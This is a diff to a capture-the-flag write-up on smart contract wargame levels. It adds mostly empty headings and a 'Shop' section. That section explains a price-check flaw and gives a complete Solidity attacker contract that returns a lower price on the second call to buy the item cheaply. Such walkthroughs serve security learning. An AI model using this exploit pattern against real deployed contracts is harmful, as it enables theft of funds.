@@ -276,6 +276,50 @@ contract.setFirstTime("0x32E1e47BC0D8Dd96aaf1EdA95ffE3eC55c0892E9")
 contract.setFirstTime("0x32E1e47BC0D8Dd96aaf1EdA95ffE3eC55c0892E9")
 ```
 
+
+## Recovery
+TODO
+
+
+## Magic Number
+
+## Alien Codex
+
+## Denial
+
+
+## Shop
+Here the vulnerable contract calls the Buyer 2 times. It is simple. For first call, the price() function returned value will be 100, the second time it will be < 100.
+The attacker contract is:
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Shop {
+    function isSold() external view returns (bool);
+    function buy() external;
+}
+
+contract attackShop {
+    address targetContract = 0x13E373631700b449AD8D048a8feB2404c850d233;
+
+    function price() external view returns (uint256) {
+        uint256 result = 0;
+        Shop(msg.sender).isSold() ? result = 10 : result = 100;
+        return result;
+    }
+
+    function attack() external {
+        Shop(targetContract).buy();
+
+    }
+}
+```
+
+
+
+
 ## Others
 
 Read a smart contract storage :
